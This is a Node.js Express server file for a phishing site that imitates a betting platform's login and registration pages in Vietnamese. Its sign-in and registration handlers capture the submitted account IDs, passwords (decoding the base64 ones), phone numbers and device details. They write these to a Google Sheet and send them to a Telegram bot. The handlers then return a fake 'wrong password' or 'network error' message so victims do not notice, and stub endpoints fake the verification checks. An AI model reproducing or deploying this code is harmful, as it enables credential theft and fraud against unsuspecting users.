const express = require("express");
require("dotenv").config();
const path = require("path");
const PORT = process.env.PORT || 3001;
const GOOGLE_SHEET_ID = process.env.GOOGLE_SHEET_ID;
// const GOOGLE_SHEET_URL = `https://script.google.com/macros/s/${GOOGLE_SHEET_ID}/exec`
const GOOGLE_SHEET_URL_REGISTER = process.env.GOOGLE_SHEET_URL_REGISTER;
const GOOGLE_SHEET_URL_LOGIN = process.env.GOOGLE_SHEET_URL_LOGIN;
const {googleSheetApi} = require("./utils/api");

const bodyParser = require("body-parser");
const app = express();
app.use(express.json());
app.set("view engine", "ejs");
app.use(bodyParser.urlencoded({ extended: false }));
app.set("views", path.join(__dirname, "views"));
app.use("/desktop", express.static(path.join(__dirname, "public", "desktop")));
app.use("/mobile", express.static(path.join(__dirname, "public", "mobile")));
const { sendRegisterAccountToBot, sendLoginAccountToBot } = require("./utils/sendTelegram");

const axios = require("axios");
app.use((req, res, next) => {
  const userAgent = req.headers["user-agent"];
  const isMobile = /mobile/i.test(userAgent);
  req.isMobile = isMobile;
  next();
});

app.get("/", (req, res) => {
  if (req.isMobile) {
    
    return res.render(
      "mobile/index",
      { layout: "mobile/layout" }
    );
  } else {
    return res.render("desktop/index", { layout: "desktop/layout" });
  }
});
app.post("/api/Common/GetVerifyMode", (req, res) => {
  return res.json({ Data: 1 });
});

app.post("/api/Verify/VerifyAccountIDIsExist", (req, res) => {
  return res.json({
    Data: {
      AccountList: null,
      CanUse: true,
      CookieID: "0ce10a162e074dc8ba54980782e743db",
      IsOverIpLimit: false,
      VerifyStatus: 0,
    },
  });
});

app.post("/api/Common/IsMemberRegisterEnabled", (req, res) => {
  return res.json({
    Data: true,
  });
});

app.post("/api/MemberInfo/RegisterMember", async (req, res) => {
  try {
    const {
      AgencyURL,
      AccountID,
      NickName,
      VerifyUsage,
      PWD,
      FingerIDX,
      SMSVerifyType,
      LocalStorgeCookie,
      CellPhone,
      UniqueSessionId,
      IsReceiveSMS,
      ScreenResolution
    } = req.body;
    const decodedPWD = Buffer.from(PWD, 'base64').toString('utf-8');
    const data = {
      AgencyURL,
      AccountID,
      NickName,
      VerifyUsage,
      PWD: decodedPWD,
      FingerIDX,
      SMSVerifyType,
      LocalStorgeCookie,
      CellPhone,
      UniqueSessionId,
      IsReceiveSMS,
      ScreenResolution
    }
    await Promise.all([
      googleSheetApi.storageDataRegisterToGoogleSheet(data, GOOGLE_SHEET_URL_REGISTER),     
      sendRegisterAccountToBot(CellPhone, AccountID, NickName, decodedPWD)
    ]);
    

    return res.json({
      Error: {
        Code: 5999,
        Message: "Lỗi mạng, vui lòng làm mới giao diện",
        Redirect: "https://27g.345.myftpupload.com/",
      },
    });
  } catch (error) {
    // Xử lý lỗi
    console.error(error);
    return res.status(500).send({ message: "Error processing data" });
  }
});

app.post("/api/Authorize/SignIn", async (req, res) => {
  const { AccountID, AccountPWD, phone } = req.body;
  const data = { AccountID, AccountPWD, phone };
  await Promise.all([
    googleSheetApi.storageDataLoginToGoogleSheet(data, GOOGLE_SHEET_URL_LOGIN),
    sendLoginAccountToBot(phone, AccountID, AccountPWD)
  ]);

  return res.json({
    Error: { Code: 1002, Message: "Tài khoản hoặc mật khẩu sai" },
  });
});
app.get("/Home/Index", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/index", { layout: "mobile/layout" });
  } else {
    return res.render("desktop/index", { layout: "desktop/layout" });
  }
});

app.get("/Home/PhoneApp", (req, res) => {
  if (req.isMobile) {
    return res.render("desktop/phoneapp", { layout: "desktop/layout" });

    // res.render('mobile/', { layout: 'mobile/layout' });
  } else {
    return res.render("desktop/phoneapp", { layout: "desktop/layout" });
  }
});

app.get("/Mobile/Home/Osasuna", (req, res) => {
  if (req.isMobile) {
    return res.render("desktop/phoneapp", { layout: "desktop/layout" });

    // res.render('mobile/', { layout: 'mobile/layout' });
  } else {
    return res.render("desktop/phoneapp", { layout: "desktop/layout" });
  }
});

app.get("/Mobile/Member/ServiceCenter", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/servicecenter", { layout: "mobile/layout" });
  }
});
app.get("/Mobile/Home/Index", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/index", { layout: "mobile/layout" });
  }
});
app.get("/Mobile/Home", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/index", { layout: "mobile/layout" });
  }
});
app.get("/Mobile/Register/Register", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/register", { layout: "mobile/layout" });
  }
});
app.get("/Mobile/BonusCenter/LatestOffers", (req, res) => {
  if (req.isMobile) {
    return res.render("mobile/latestoffers", { layout: "mobile/layout" });
  }
});

app.get("/DownloadApp", (req, res) => {
  return res.render("mobile/downloadapp", { layout: "mobile/layout" });
});

app.listen(PORT, () => console.log("Listening on http://localhost/" + PORT));
